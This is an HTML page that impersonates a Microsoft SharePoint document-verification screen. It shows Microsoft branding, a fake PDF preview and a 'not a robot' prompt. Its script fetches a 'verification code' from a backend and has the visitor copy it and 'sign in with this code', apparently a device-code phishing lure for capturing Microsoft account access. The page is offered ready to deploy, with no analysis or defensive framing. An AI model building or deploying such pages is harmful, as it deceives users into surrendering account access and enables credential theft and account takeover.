<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SharePoint · Document Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #939ba2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; overflow: hidden; }
        
        /* Blurred background mockup */
        .bg-mock { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f3f2f1; filter: blur(4px); z-index: 0; }
        
        .card { background: white; border-radius: 4px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); padding: 40px; text-align: center; width: 100%; max-width: 450px; z-index: 1; }
        
        /* Logos */
        .logo-area { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; font-size: 16px; }
        .ms-grid { display: grid; grid-template-columns: 10px 10px; gap: 2px; }
        .ms-grid div { width: 10px; height: 10px; }
        
        h1 { font-size: 24px; font-weight: 700; color: #1b1b1b; margin-bottom: 16px; line-height: 1.2; }
        .subtitle { font-size: 14px; color: #444; margin-bottom: 20px; }
        
        .doc-preview { border: 1px solid #dcdcdc; border-radius: 4px; padding: 15px; text-align: left; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
        .doc-preview-name { font-size: 14px; font-weight: 700; color: #000; }
        .doc-preview-meta { font-size: 13px; color: #555; }
        
        /* New verification UI elements */
        .input-label { font-size: 13px; color: #323130; margin-bottom: 8px; display: block; }
        .code-input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #8a8886; border-radius: 2px; font-size: 18px; text-align: center; color: #323130; font-weight: 600; }
        .btn-secondary { width: 100%; padding: 12px; background: white; border: 1px solid #8a8886; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
        .btn-primary { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; font-size: 15px; font-weight: 600; cursor: pointer; }
        .timer-text { font-size: 12px; color: #605e5c; margin-top: 15px; }
        .footer { margin-top: 30px; font-size: 12px; color: #767676; }
    </style>
</head>
<body>

    <div class="bg-mock"></div>

    <div class="card">
        <div class="logo-area">
            <div class="ms-grid">
                <div style="background-color: #f25022;"></div><div style="background-color: #7fba00;"></div>
                <div style="background-color: #00a4ef;"></div><div style="background-color: #ffb900;"></div>
            </div>
            <span>+</span>
            <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/microsoft-sharepoint.webp" style="width: 24px; height: 24px;">
            <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
        </div>

        <h1>Please confirm that you are not a robot</h1>
        <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
        
        <div class="doc-preview">
            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" style="width: 30px; height: 30px; opacity: 0.7;">
            <div>
                <div class="doc-preview-name">Document Details</div>
                <div class="doc-preview-meta">Document Details.pdf · 12 pages</div>
            </div>
        </div>

        <div id="verification-ui" style="display: none;">
            <label class="input-label">Your verification code</label>
            <input type="text" id="code-box" class="code-input" readonly>
            <button class="btn-secondary" onclick="copyCode()">Copy code</button>
            <button class="btn-primary" onclick="signIn()">Sign in with this code</button>
            <div class="timer-text">Verification code expires in 9:54</div>
        </div>

        <button id="start-btn" class="btn-primary" onclick="startVerification()">Get verification code</button>
        
        <div class="footer">
            Microsoft account · SharePoint · Security · Privacy
        </div>
    </div>

    <script>
        async function startVerification() {
            // Call your backend to get the code
            const response = await fetch('/api/device/start');
            const data = await response.json();
            
            document.getElementById('code-box').value = data.code;
            document.getElementById('start-btn').style.display = 'none';
            document.getElementById('verification-ui').style.display = 'block';
        }

        function copyCode() {
            const copyText = document.getElementById("code-box");
            copyText.select();
            document.execCommand("copy");
            alert("Code copied!");
        }

        function signIn() {
            window.location.href = '/api/device/verify';
        }
    </script>
</body>
</html>
